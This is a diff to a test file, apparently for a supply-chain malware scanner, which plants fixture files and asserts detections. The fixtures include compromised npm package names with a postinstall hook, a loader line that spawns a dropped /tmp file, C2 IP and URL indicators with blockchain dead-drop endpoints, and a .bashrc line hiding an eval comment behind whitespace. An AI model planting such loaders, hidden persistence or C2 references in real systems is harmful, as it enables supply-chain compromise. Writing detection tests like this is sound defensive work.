@@ -42,7 +42,9 @@ function run() {
       "@validate-sdk/v2": "^1.0.0",
       "google-cloud-secret-manager-config-poc": "^1.0.0",
       "free-claude": "^1.0.0",
-      "node-fetch-utils": "^1.0.0"
+      "node-fetch-utils": "^1.0.0",
+      "rate-limit-flexible": "^1.0.2",
+      "tailwindcss-merge": "1.0.4"
     },
     scripts: {
       postinstall: "node utils.cjs"
@@ -61,6 +63,18 @@ function run() {
     "  out.on('finish', () => cp.spawn(process.execPath, ['/tmp/0001.dat']));",
     "});",
   ].join("\n"));
+  write(path.join(home, "repo", "chainveil-lib.min.js"), [
+    "global['_V']='A6-519-83';",
+    "const c2 = '166.88.54.158';",
+    "const ws = 'ws://166.88.54.158:443';",
+    "const boot = 'http://166.88.54.158/$/boot';",
+    "const tron = 'https://api.trongrid.io/v1/accounts/TMfKQEd7TJJa5xNZJZ2Lep838vrzrs7mAP/transactions';",
+    "const aptos = 'https://fullnode.mainnet.aptoslabs.com/v1/accounts/0xbe037400670fbf1c32364f762975908dc43eeb38759263e7dfcdabc76380811e/transactions';",
+    "const bsc = 'bsc-dataseed.binance.org';",
+    "const method = 'eth_getTransactionByHash';",
+    "const key = 'ThZG+0jfXE6VAGOJ';"
+  ].join("\n"));
+  write(path.join(home, ".bashrc"), `export PATH="$HOME/bin:$PATH"\n${" ".repeat(200)}# global['_V']='A6-519-83'; eval('chainveil')\n`);
   write(path.join(home, ".cache", "yay", "orphaned-tool", "PKGBUILD"), [
     "pkgname=orphaned-tool",
     "post_install() {",
@@ -599,6 +613,12 @@ function run() {
   assert(ids.has("compromised-npm-package-reference"));
   assert(report.findings.some((finding) => finding.id === "compromised-npm-package-reference" && finding.evidence.includes("free-claude")));
   assert(report.findings.some((finding) => finding.id === "compromised-npm-package-reference" && finding.evidence.includes("node-fetch-utils")));
+  assert(ids.has("chainveil-npm-package-reference"));
+  assert(ids.has("chainveil-network-indicator"));
+  assert(ids.has("chainveil-blockchain-c2-indicator"));
+  assert(ids.has("chainveil-text-indicator"));
+  assert(ids.has("chainveil-loader-shape"));
+  assert(ids.has("chainveil-shell-config-persistence"));
   assert(ids.has("atomicarch-aur-atomic-lockfile-reference"));
   assert(ids.has("atomicarch-aur-npm-loader"));
   assert(ids.has("atomicarch-payload-text-indicator"));
